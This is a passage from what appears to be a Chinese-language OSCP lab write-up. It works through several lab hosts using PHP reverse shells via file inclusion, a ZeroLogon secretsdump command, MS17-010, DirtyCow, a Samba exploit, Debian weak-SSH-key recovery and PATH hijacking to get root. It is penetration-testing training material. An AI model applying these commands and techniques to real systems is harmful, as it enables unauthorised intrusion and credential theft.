<p><img src="https://i.imgur.com/QHRs834.png" alt=""><br>這樣我們就成功上傳了 php reverse shell上去</p>
<p>再用我們前面找到的LFI進行讀取</p>
<p><img src="https://i.imgur.com/dQFDfRP.png" alt=""></p>
<p><img src="https://i.imgur.com/0rQjIrg.png" alt=""></p>
<p>原本想說要用mysql登入local的</p>
<p>但失敗了(好像是shell的問題，跳不出response)</p>
<p>看了kernel版本丟去exploitdb剛好有一個可以試試<br><a href="https://www.exploit-db.com/exploits/26368" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/26368</a></p>
<p>檢查過gcc也有</p>
<p>過程大概是這樣:</p>
<p><img src="https://i.imgur.com/nzdDIW2.png" alt=""></p>
<p>因我 <code>which wget</code> 並沒有</p>
<p>但在 /usr/local/bin裡面有發現，可能是沒加進環境變數內</p>
<p>就這樣用了</p>
<h2 id="10-11-1-120"><a href="#10-11-1-120" class="headerlink" title="10.11.1.120"></a>10.11.1.120</h2><p>錯誤:<br><img src="https://i.imgur.com/sH6I4hD.png" alt=""><br>解法:<a href="https://github.com/dirkjanm/CVE-2020-1472/issues/1" target="_blank" rel="noopener">https://github.com/dirkjanm/CVE-2020-1472/issues/1</a><br><code>impacket-secretsdump  -no-pass -just-dc  xor.com/xor-dc01\$@10.11.1.120</code><br><a href="https://github.com/VoidSec/CVE-2020-1472" target="_blank" rel="noopener">https://github.com/VoidSec/CVE-2020-1472</a><br><a href="https://blog.xuite.net/tolarku/blog/151029105" target="_blank" rel="noopener">https://blog.xuite.net/tolarku/blog/151029105</a></p>
<h2 id="10-11-1-125"><a href="#10-11-1-125" class="headerlink" title="10.11.1.125"></a>10.11.1.125</h2><p>nmap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 16:24 CST</span><br><span class="line">Stats: 0:04:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 51.58% done; ETC: 16:32 (0:03:50 remaining)</span><br><span class="line">Nmap scan report for 10.11.1.125</span><br><span class="line">Host is up (0.39s latency).</span><br><span class="line">Not shown: 65533 filtered ports</span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">21/tcp  open  ftp     Acritum Femitter Server ftpd</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| drw-rw-rw-   1 ftp      ftp            0 Sep 23  2015 . [NSE: writeable]</span><br><span class="line">| drw-rw-rw-   1 ftp      ftp            0 Sep 23  2015 .. [NSE: writeable]</span><br><span class="line">| -rw-rw-rw-   1 ftp      ftp        11164 Dec 26  2006 house.jpg [NSE: writeable]</span><br><span class="line">| -rw-rw-rw-   1 ftp      ftp          920 Jan 03  2007 index.htm [NSE: writeable]</span><br><span class="line">|_drw-rw-rw-   1 ftp      ftp            0 Sep 23  2015 Upload [NSE: writeable]</span><br><span class="line">|_ftp-bounce: bounce working!</span><br><span class="line">| ftp-syst: </span><br><span class="line">|_  SYST: Internet Component Suite</span><br><span class="line">123/tcp open  ntp?</span><br><span class="line">MAC Address: 00:50:56:B8:6D:F6 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: WAP|general purpose|media device</span><br><span class="line">Running (JUST GUESSING): Apple embedded (90%), Microsoft Windows XP|2003|2000 (89%), RIM Tablet OS 2.X (87%), FreeBSD 6.X (86%)</span><br><span class="line">OS CPE: cpe:/h:apple:airport_extreme cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_server_2003::- cpe:/o:microsoft:windows_2000::sp4 cpe:/o:rim:tablet_os:2 cpe:/o:freebsd:freebsd:6.2</span><br><span class="line">Aggressive OS guesses: Apple AirPort Extreme WAP (90%), Microsoft Windows Server 2003 SP0 or Windows XP SP2 (89%), Microsoft Windows XP SP2 (89%), Microsoft Windows XP SP3 (89%), Microsoft Windows 2000 SP4 (88%), Microsoft Windows XP SP3 or Small Business Server 2003 (88%), Microsoft Windows XP (88%), Microsoft Windows XP Home SP1 (French) (87%), Microsoft Windows XP Professional SP2 (French) (87%), BlackBerry Tablet OS 2 (87%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 629.13 seconds</span><br></pre></td></tr></table></figure></p>
<p>還蠻明顯的就是要打FTP</p>
<p>最後找到這個腳本，直接用了就拿下了<br><a href="https://github.com/T3jv1l/Femitter-FTP-Server-exploit-/blob/master/Femitter.py" target="_blank" rel="noopener">https://github.com/T3jv1l/Femitter-FTP-Server-exploit-/blob/master/Femitter.py</a></p>
<p>查了下得知是利用MOF進行遠端執行<br>MOF的詳細可以參考這個連結:<br><a href="https://www.twblogs.net/a/5d1b1724bd9eee1e5c830386/zh-cn" target="_blank" rel="noopener">https://www.twblogs.net/a/5d1b1724bd9eee1e5c830386/zh-cn</a><br><img src="https://i.imgur.com/wJdTdsS.png" alt=""></p>
<p><img src="https://i.imgur.com/DNhG7Uw.png" alt=""></p>
<p><img src="https://i.imgur.com/4TskzGN.png" alt=""></p>
<p>馬的這三小文字看無</p>
<h2 id="10-11-1-128"><a href="#10-11-1-128" class="headerlink" title="10.11.1.128"></a>10.11.1.128</h2><p>nmap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.11.1.128</span><br><span class="line">Host is up (0.40s latency).</span><br><span class="line">Not shown: 65521 closed ports</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">21/tcp    open  ftp          Microsoft ftpd 5.0</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">25/tcp    open  smtp         Microsoft ESMTP 5.0.2195.6713</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| smtp-vuln-cve2010-4344: </span><br><span class="line">|_  The SMTP server is not Exim: NOT VULNERABLE</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">80/tcp    open  http         Microsoft IIS httpd 5.0</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     ASPSESSIONIDCSTBQRBT: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.11.1.128</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://10.11.1.128:80/</span><br><span class="line">|     Form id: </span><br><span class="line">|_    Form action: login-off.asp</span><br><span class="line">|_http-dombased-xss: Couldn&apos;t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /_vti_bin/_vti_aut/author.dll: Frontpage file or folder</span><br><span class="line">|   /_vti_bin/_vti_aut/author.exe: Frontpage file or folder</span><br><span class="line">|   /_vti_bin/_vti_adm/admin.dll: Frontpage file or folder</span><br><span class="line">|   /_vti_bin/_vti_adm/admin.exe: Frontpage file or folder</span><br><span class="line">|   /_vti_bin/fpcount.exe?Page=default.asp|Image=3: Frontpage file or folder</span><br><span class="line">|   /_vti_bin/shtml.dll: Frontpage file or folder</span><br><span class="line">|   /_vti_bin/shtml.exe: Frontpage file or folder</span><br><span class="line">|_  /printers/: Potentially interesting folder (401 Access Denied)</span><br><span class="line">|_http-server-header: Microsoft-IIS/5.0</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server&apos;s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       http://ha.ckers.org/slowloris/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">|_http-stored-xss: Couldn&apos;t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-trace: TRACE is enabled</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:microsoft:iis:5.0: </span><br><span class="line">|     	CVE-2009-3023	9.3	https://vulners.com/cve/CVE-2009-3023</span><br><span class="line">|     	CVE-2008-1446	9.0	https://vulners.com/cve/CVE-2008-1446</span><br><span class="line">|     	CVE-2009-1535	7.6	https://vulners.com/cve/CVE-2009-1535</span><br><span class="line">|     	CVE-2009-1122	7.6	https://vulners.com/cve/CVE-2009-1122</span><br><span class="line">|     	CVE-2011-5279	6.4	https://vulners.com/cve/CVE-2011-5279</span><br><span class="line">|     	CVE-2009-4444	6.0	https://vulners.com/cve/CVE-2009-4444</span><br><span class="line">|_    	CVE-2009-2521	2.6	https://vulners.com/cve/CVE-2009-2521</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">443/tcp   open  https?</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn&apos;t find any CSRF vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn&apos;t find any DOM based XSS.</span><br><span class="line">|_http-stored-xss: Couldn&apos;t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_ssl-ccs-injection: No reply from server (TIMEOUT)</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">445/tcp   open  microsoft-ds Microsoft Windows 2000 microsoft-ds</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">1025/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">1026/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">1029/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">3372/tcp  open  msdtc        Microsoft Distributed Transaction Coordinator</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">5800/tcp  open  vnc-http     TightVNC</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">5900/tcp  open  vnc          VNC (protocol 3.8)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_ssl-poodle: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_sslv2-drown: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_tls-ticketbleed: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">27900/tcp open  ms-sql-s     Microsoft SQL Server 2000 8.00.194; RTM</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">MAC Address: 00:50:56:B8:3A:6C (VMware)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.80%E=4%D=2/10%OT=21%CT=1%CU=31866%PV=Y%DS=1%DC=D%G=Y%M=005056%T</span><br><span class="line">OS:M=5E404DF0%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=102%TI=I%TS=0)SEQ(S</span><br><span class="line">OS:P=FE%GCD=1%ISR=102%TI=I%II=I%SS=O%TS=0)OPS(O1=M529NW0NNT00NNS%O2=M529NW0</span><br><span class="line">OS:NNT00NNS%O3=M529NW0NNT00%O4=M529NW0NNT00NNS%O5=M529NW0NNT00NNS%O6=M529NN</span><br><span class="line">OS:T00NNS)WIN(W1=FAF0%W2=FAF0%W3=FAF0%W4=FAF0%W5=FAF0%W6=FAF0)ECN(R=Y%DF=Y%</span><br><span class="line">OS:T=80%W=FAF0%O=M529NW0NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)</span><br><span class="line">OS:T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=N%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=</span><br><span class="line">OS:N)T7(R=N)U1(R=Y%DF=N%T=80%IPL=38%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)</span><br><span class="line">OS:IE(R=Y%DFI=S%T=80%CD=Z)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: dj.acme.local; OSs: Windows, Windows 2000; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_2000</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_smb-vuln-ms10-054: false</span><br><span class="line">|_smb-vuln-ms10-061: false</span><br><span class="line">| smb-vuln-ms17-010: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2017-0143</span><br><span class="line">|     Risk factor: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists in Microsoft SMBv1</span><br><span class="line">|        servers (ms17-010).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure date: 2017-03-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br><span class="line">|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 3523.66 seconds</span><br></pre></td></tr></table></figure></p>
<p>關鍵字:<code>Microsoft Windows 2000</code>、<code>445 port</code>、nmap跳ms17-010提醒</p>
<p>就來try<br><img src="https://i.imgur.com/cLP41K8.png" alt=""><br>主要改的地方跟 <code>10.11.1.31</code>差不多<br><img src="https://i.imgur.com/1wiS7aC.png" alt=""></p>
<p><img src="https://i.imgur.com/fJgNset.png" alt=""></p>
<p><img src="https://i.imgur.com/l6SKyeI.png" alt=""></p>
<h2 id="10-11-1-133-gh0st"><a href="#10-11-1-133-gh0st" class="headerlink" title="10.11.1.133[gh0st] (*)"></a>10.11.1.133[gh0st] (*)</h2><p>web:<br><img src="https://i.imgur.com/0gOZLvT.png" alt=""><br>看起來好難<br>gobuster, 比較有意思的是 <code>test.asp</code>:<br><img src="https://i.imgur.com/gDzfGvb.png" alt=""><br>可以看到他引入一個source<br><img src="https://i.imgur.com/8aw7QpJ.png" alt=""><br>看到一串js, 把它貼去Console看看<br><img src="https://i.imgur.com/xwayKvX.png" alt=""><br>貼上去之後可以看到有一個被註解字串，把註解的字串解開來後發現是一個路徑<br><img src="https://i.imgur.com/n9ZSlMP.png" alt=""></p>
<p><img src="https://i.imgur.com/k5Mu4Lt.png" alt=""><br>我們在未被註解的js變數上發現許多的圖片檔名<br>嘗試到<code>offsecphun5.bmp</code>就自動轉到<br><code>http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/1.jpeg</code><br><img src="https://i.imgur.com/pFWt2rk.png" alt=""><br>我們把圖片檔名拿掉嘗試 Directory listing<br><img src="https://i.imgur.com/g7jm0ul.png" alt=""><br>把<code>slogin_POST_username</code>丟去GOOGLE發現RFI<br><a href="https://www.exploit-db.com/exploits/7444" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/7444</a></p>
<p>把我們的php reverse shell 改名成<code>header.inc.php</code><br>就可以利用RFI拿到shell<br><img src="https://i.imgur.com/Wft5DCI.png" alt=""></p>
<p>可以直接利用DirtyCow更改/etc/passwd拿到root<br><a href="https://www.exploit-db.com/exploits/40839" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/40839</a></p>
<p>因為 <code>/tmp</code>不可寫，所以我找了個可寫的path<br><img src="https://i.imgur.com/GOXe4xn.png" alt=""><br>最後找到<code>/dev/shm</code>可寫</p>
<p>跑了LinEnum腳本後得知有<code>gcc-4.4</code><br>開始改寫腳本，因<code>/tmp</code>不可寫，所以改成如下<br><img src="https://i.imgur.com/qzUuOWV.png" alt=""></p>
<p><img src="https://i.imgur.com/bN0KQZd.png" alt=""></p>
<p><img src="https://i.imgur.com/CiRoVtZ.png" alt=""></p>
<h2 id="10-11-1-136-sufferance"><a href="#10-11-1-136-sufferance" class="headerlink" title="10.11.1.136[sufferance] (*)"></a>10.11.1.136[sufferance] (*)</h2><p>nmap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.11.1.136</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 4.3p2 Debian 9 (protocol 2.0)</span><br><span class="line">|_auth-owners: root</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 88:23:98:0d:9d:8a:20:59:35:b8:14:12:14:d5:d0:44 (DSA)</span><br><span class="line">|_  2048 6b:5d:04:71:76:78:56:96:56:92:a8:02:30:73:ee:fa (RSA)</span><br><span class="line">113/tcp open  ident</span><br><span class="line">|_auth-owners: identd</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: LOCAL)</span><br><span class="line">|_auth-owners: root</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 3.0.24 (workgroup: LOCAL)</span><br><span class="line">|_auth-owners: root</span><br><span class="line">MAC Address: 00:50:56:B8:2B:89 (VMware)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.80%E=4%D=2/23%OT=22%CT=1%CU=44350%PV=Y%DS=1%DC=D%G=Y%M=005056%T</span><br><span class="line">OS:M=5E525504%P=x86_64-pc-linux-gnu)SEQ(SP=CB%GCD=1%ISR=CE%TI=Z%II=I%TS=8)O</span><br><span class="line">OS:PS(O1=M529ST11NW6%O2=M529ST11NW6%O3=M529NNT11NW6%O4=M529ST11NW6%O5=M529S</span><br><span class="line">OS:T11NW6%O6=M529ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)E</span><br><span class="line">OS:CN(R=Y%DF=Y%T=40%W=16D0%O=M529NNSNW6%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F</span><br><span class="line">OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%R</span><br><span class="line">OS:D=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%</span><br><span class="line">OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 2h17m00s, deviation: 3h32m08s, median: -13m00s</span><br><span class="line">|_nbstat: NetBIOS name: SUFFERANCE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Unix (Samba 3.0.24)</span><br><span class="line">|   NetBIOS computer name: </span><br><span class="line">|   Workgroup: THINC.LOCAL\x00</span><br><span class="line">|_  System time: 2020-02-23T05:20:31-05:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: share (dangerous)</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1541.00 seconds</span><br></pre></td></tr></table></figure></p>
<p>因為是Linux所以ms17-010就不用看了<br>進去smb看看<br><img src="https://i.imgur.com/sD12tqE.png" alt=""><br>沒什麼鳥<br>那個資料夾還不給讀<br>嘗試了RCE的cve失敗，另一個任意掛載資料夾的exploit成功了<br><a href="https://github.com/MarkBuffalo/exploits/blob/master/Samba/CVE-2010-0926.c" target="_blank" rel="noopener">https://github.com/MarkBuffalo/exploits/blob/master/Samba/CVE-2010-0926.c</a><br><img src="https://i.imgur.com/Iz6ID9u.png" alt=""></p>
<p>進去後在 /var/backup/ 裡面發現有ssh的資料夾(其他東西都不給下載)<br><img src="https://i.imgur.com/CoMozRP.png" alt=""></p>
<p>嘗試後可以把<code>authorized_keys</code>和<code>known_hosts</code>下載下來<br>這邊看解答才知道可以用public key爆出private key<br>source:<a href="https://github.com/g0tmi1k/debian-ssh" target="_blank" rel="noopener">https://github.com/g0tmi1k/debian-ssh</a><br>我們把<code>authorized_keys</code>的內容丟到key pool看看<br><img src="https://i.imgur.com/Ecdh0I3.png" alt=""><br>可以看到有符合的<br>我們把它成對的 private key 拿來做ssh login<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/oscp/10.11.1.136# ssh bob@10.11.1.136 -i f1fb2162a02f0f7c40c210e6167f05ca-16858 </span><br><span class="line">sign_and_send_pubkey: no mutual signature supported</span><br><span class="line">bob@10.11.1.136&apos;s password:</span><br></pre></td></tr></table></figure></p>
<p>發現是失敗的查了下看到這個<br><a href="https://blog.csdn.net/moonx/article/details/83792731" target="_blank" rel="noopener">https://blog.csdn.net/moonx/article/details/83792731</a><br>只要在 <code>ssh_config</code> 或<code>~/.ssh/config</code> 內加上 <code>PubkeyAcceptedKeyTypes +ssh-dss</code><br>就可以了<br><img src="https://i.imgur.com/zMHRz3Q.png" alt=""></p>
<p>跑了LinEnum.sh之後發現有趣的東西<br><img src="https://i.imgur.com/h8FaCks.png" alt=""></p>
<p>我們可以用scp把有趣的東西下載下來<br><code>scp -i f1fb2162a02f0f7c40c210e6167f05ca-16858 bob@10.11.1.136:~/uploadtosecure ./</code><br>用r2開他看看<br><img src="https://i.imgur.com/16tqP9Q.png" alt=""><br>可以看到他call了system再去叫scp傳檔案<br>這邊我們可以覆寫他的環境變數，把PATH改成<code>/tmp</code><br>然後再<code>echo &#39;/bin/sh&#39; &gt; /tmp/scp</code><br>這樣他叫的scp就會是<code>/bin/sh</code><br><img src="https://i.imgur.com/4pqa81F.png" alt=""></p>
<p>PS 為什麼是<code>echo</code>而不是<code>cp</code>呢?<br>因為如果是cp的話，<code>/bin/sh</code>本身也會吃 <code>sys.argv</code><br>所以如果給他<code>-r</code>會噴error<br>但如果是<code>echo</code>的話，我們沒有特別去define <code>sys.argv</code><br>所以就算後面給他argv他也不會吃，只會跑<code>/bin/sh</code></p>
<h2 id="10-11-1-141-fc4"><a href="#10-11-1-141-fc4" class="headerlink" title="10.11.1.141 [fc4] (*)"></a>10.11.1.141 [fc4] (*)</h2><p>nmap </p>
